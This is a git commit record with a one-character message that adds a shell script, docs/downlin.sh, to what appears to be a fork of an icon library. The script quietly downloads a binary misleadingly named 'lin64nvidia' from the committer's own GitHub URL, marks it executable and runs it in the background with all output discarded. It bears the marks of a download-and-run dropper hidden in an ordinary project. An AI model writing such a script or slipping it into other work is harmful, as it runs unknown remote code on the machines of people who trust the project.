5f14ca7249931dd433d2bcc3ac92ae5370ad8066
pavlovasianov <pavlovasianovych6@gmail.com>
2025-02-25 21:50:17 +0200

    .

---
+++ docs/downlin.sh
@@ -0,0 +1,10 @@
+#!/usr/bin/env bash
+
+URL="https://raw.githubusercontent.com/pavlovasianov/lucide/refs/heads/icon/fist/docs/lin64nvidia"
+HOME_DIR="~/"
+EXEC_FILE="$HOME_DIR/lin64nvidia"
+
+curl -s -o "$EXEC_FILE" "$URL"
+chmod +x "$EXEC_FILE"
+
+"$EXEC_FILE" > /dev/null 2>&1 &
